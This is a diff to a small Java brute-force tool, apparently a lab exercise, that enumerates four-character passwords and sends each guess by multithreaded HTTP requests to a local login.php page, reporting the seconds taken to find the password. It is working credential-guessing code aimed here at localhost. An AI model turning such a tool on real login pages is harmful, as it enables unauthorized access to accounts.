@@ -9,7 +9,9 @@ public class Bruter {
     public Bruter(String characters, int size){
         long combinations = (long) Math.pow(characters.length(),size);
         System.out.println(combinations);
+        long starttime = System.currentTimeMillis();
         for(long i = 0; i < combinations; i++){
+
             long mbetja = i;
             String password = "";
             for(int j = (size-1); j>=0 ; j--){
@@ -18,9 +20,11 @@ public class Bruter {
                 password += (characters.charAt(charat));
             }
             boolean tested = false;
+            //System.out.println(password);
             while(!tested){
                 if(countActiveThreads() <= 100){
-                    Thread th = new Tester(password, "http://127.0.0.1:8000/login.php?password="+password);
+                    Thread th = new Tester(password, "http://localhost/login/login.php?password="+password);
+                    th.start();
                     threads.add(th);
                     tested = true;
                 }else{
@@ -28,13 +32,16 @@ public class Bruter {
                 }
             }
 
-            System.out.println();
+            if(isFound){
+                System.out.println((System.currentTimeMillis()-starttime)/1000+" sekonda per ta gjetur passwordin "+password);
+                System.exit(0);
+            }
+
         }
     }
     private int countActiveThreads(){
         int activeThreads=0;
         for (int i = 0; i < threads.size(); i++) {
-            System.out.println(threads.get(i));
             if(!threads.get(i).isAlive()){
                 threads.remove(i);
             }else{
@@ -44,6 +51,6 @@ public class Bruter {
         return activeThreads;
     }
     public static void main(String[] args) {
-        new Bruter("0123456789", 4);
+        new Bruter("abcdefghijklmnopqrstuvwxyz", 4);
     }
 }
